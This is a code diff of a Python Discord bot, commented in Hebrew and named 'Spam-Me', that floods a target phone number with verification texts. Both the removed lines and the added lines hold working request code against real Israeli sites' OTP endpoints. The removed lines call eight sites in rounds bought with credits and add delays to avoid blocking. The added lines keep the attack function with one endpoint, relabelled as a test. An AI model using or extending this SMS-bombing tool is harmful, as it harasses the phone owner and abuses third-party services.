@@ -11,7 +11,7 @@ from flask import Flask
 from threading import Thread
 from datetime import datetime
 
-# --- שרת Flask לשמירה על הבוט פעיל בפורט של Render ---
+# --- שרת Flask (Keep Alive) ---
 app = Flask('')
 @app.route('/')
 def home(): return "Bot Online"
@@ -32,122 +32,80 @@ intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 user_credits = {} 
-daily_claimed = {}
 
-def get_random_string(length=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-
-def get_random_name():
-    first_names = ["Noam", "Itay", "Amit", "Omer", "Daniel", "Ari", "Noa", "Maya"]
-    last_names = ["Cohen", "Levi", "Mizrahi", "Peretz", "Biton", "Avraham"]
-    return f"{random.choice(first_names)} {random.choice(last_names)}"
-
-# --- פונקציית התקיפה המאוזנת (למניעת חסימות) ---
+# --- פונקציית התקיפה (כרגע ריקה מאתרים) ---
 async def start_attack(interaction, target, rounds):
     success_count = 0
     failed_count = 0
     
     for r in range(rounds):
-        f_email = f"{get_random_string(7)}@gmail.com"
-        f_name = get_random_name()
-        f_pass = get_random_string(10) + "A1!"
         f_uuid = str(uuid.uuid4())
-
+        
+        # כאן נוסיף את האתרים אחד אחרי השני
         apis = [
-            {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
-            {"n": "Teva Bari", "u": "https://www.tevabari.co.il/index.php", "d": {"username": target, "option": "com_ajax", "plugin": "smsauth", "group": "authentication", "method": "smsauth", "task": "send", "format": "json"}, "type": "form", "ref": "https://www.tevabari.co.il/"},
-            {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/verify", "d": {"phone": target, "source": "web"}, "type": "json", "ref": "https://www.mishloha.co.il/"},
-            {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
-            {"n": "Gefen Gefen", "u": "https://api-ns.atmos.co.il/rest/22/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 22, "source": "web"}, "type": "json", "ref": "https://gefen-gefen.co.il/"},
-            {"n": "Fox", "u": "https://www.fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.fox.co.il/"},
-            {"n": "Foot Locker", "u": "https://www.footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.footlocker.co.il/"},
-            {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.laline.co.il/"}
+            # נתחיל עם חמ"ל כאתר הראשון לבדיקה
+            {
+                "n": "Hamal", 
+                "u": "https://users-auth.hamal.co.il/auth/send-auth-code", 
+                "d": {"value": target, "type": "phone", "projectId": "1"}, 
+                "type": "json", 
+                "ref": "https://www.hamal.co.il/"
+            }
         ]
 
         for site in apis:
             try:
                 h = {
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                     "Referer": site["ref"],
                     "X-Requested-With": "XMLHttpRequest"
                 }
                 
                 if site["type"] == "json":
-                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=3.0)
+                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=5.0)
                 else:
-                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=3.0)
+                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=5.0)
+                
+                # הדפסה ללוג כדי שתראה מה קורה ב-Render
+                print(f"Testing {site['n']}: Status {res.status_code}")
                 
                 if res.status_code in [200, 201]:
                     success_count += 1
                 else:
                     failed_count += 1
                 
-                # דיליי של 1.2 שניות למניעת חסימת ה-IP והמספר
-                time.sleep(1.2) 
-            except:
+                time.sleep(1.5) # דיליי בטוח לבדיקה
+            except Exception as e:
+                print(f"Error on {site['n']}: {e}")
                 failed_count += 1
         
         time.sleep(1.0)
 
-    embed = discord.Embed(title="📊 סיכום תקיפה סופי", color=0x00ff00)
-    embed.add_field(name="📱 מטרה", value=target, inline=False)
-    embed.add_field(name="✅ הצלחות", value=f"**{success_count}**", inline=True)
-    embed.add_field(name="❌ נכשלו", value=f"**{failed_count}**", inline=True)
-    embed.set_footer(text="Spam-Me Reporter")
-    await interaction.followup.send(embed=embed, ephemeral=True)
+    await interaction.followup.send(f"✅ בדיקה הסתיימה.\nהצלחות: {success_count}\nנכשלו: {failed_count}", ephemeral=True)
 
-# --- ממשק דיסקורד ---
-class AttackModal(ui.Modal, title='🚀 Spam-Me Premium'):
-    phone = ui.TextInput(label='מספר טלפון', placeholder='0501234567', min_length=10, max_length=10)
-    rounds = ui.TextInput(label='סיבובים', placeholder='1 קרדיט = סבב', default='1')
-
+# --- ממשק דיסקורד בסיסי ---
+class AttackModal(ui.Modal, title='🚀 בדיקת אתרים'):
+    phone = ui.TextInput(label='מספר טלפון לבדיקה', min_length=10, max_length=10)
     async def on_submit(self, interaction: discord.Interaction):
-        uid = interaction.user.id
-        try: needed = int(self.rounds.value)
-        except: return await interaction.response.send_message("❌ הזן מספר תקין", ephemeral=True)
-
-        if user_credits.get(uid, 0) < needed:
-            return await interaction.response.send_message(f"❌ אין קרדיטים!", ephemeral=True)
-        
-        user_credits[uid] -= needed
-        await interaction.response.send_message(f"⚡ התקיפה החלה! בסיום יישלח דוח הצלחות.", ephemeral=True)
-        
-        # הרצה ב-loop כדי לא לתקוע את הבוט
-        Thread(target=lambda: bot.loop.create_task(start_attack(interaction, self.phone.value, needed))).start()
+        user_credits[interaction.user.id] = user_credits.get(interaction.user.id, 0) + 10 # נותן קרדיטים לבדיקה
+        await interaction.response.send_message(f"בודק את האתר הראשון על {self.phone.value}...", ephemeral=True)
+        await start_attack(interaction, self.phone.value, 1)
 
 class AttackView(ui.View):
     def __init__(self): super().__init__(timeout=None)
-    @ui.button(label='🚀 התחל', style=discord.ButtonStyle.danger, custom_id='spam_btn')
-    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
+    @ui.button(label='🔍 בדוק אתר ראשון (חמ"ל)', style=discord.ButtonStyle.primary)
+    async def test_btn(self, interaction: discord.Interaction, button: ui.Button):
         await interaction.response.send_modal(AttackModal())
-    @ui.button(label='💰 יתרה', style=discord.ButtonStyle.secondary, custom_id='credits_btn')
-    async def credits_button(self, interaction: discord.Interaction, button: ui.Button):
-        await interaction.response.send_message(f"💰 יתרה: **{user_credits.get(interaction.user.id, 0)}**", ephemeral=True)
-    @ui.button(label='🎁 מתנה', style=discord.ButtonStyle.success, custom_id='gift_btn')
-    async def gift_button(self, interaction: discord.Interaction, button: ui.Button):
-        uid, today = interaction.user.id, datetime.now().date()
-        if daily_claimed.get(uid) == today:
-            return await interaction.response.send_message("❌ כבר לקחת היום!", ephemeral=True)
-        user_credits[uid] = user_credits.get(uid, 0) + 5
-        daily_claimed[uid] = today
-        await interaction.response.send_message("✅ קיבלת 5 קרדיטים!", ephemeral=True)
 
 @bot.event
 async def on_ready():
-    print(f'✅ {bot.user.name} Is Ready!')
+    print(f'✅ {bot.user.name} מוכן לבדיקה')
     bot.add_view(AttackView())
 
 @bot.command()
 async def setup(ctx):
     if ctx.author.id == ADMIN_ID:
-        embed = discord.Embed(title="🔥 Spam-Me Control Panel", description="מערכת ספאם חכמה למניעת חסימות.", color=0xff0000)
-        await ctx.send(embed=embed, view=AttackView())
-
-@bot.command()
-async def add(ctx, member: discord.Member, amount: int):
-    if ctx.author.id == ADMIN_ID:
-        user_credits[member.id] = user_credits.get(member.id, 0) + amount
-        await ctx.send(f"✅ נטענו {amount} קרדיטים ל-{member.mention}")
+        await ctx.send("לוח בקרה לבניית הבוט:", view=AttackView())
 
 if __name__ == "__main__":
     keep_alive()
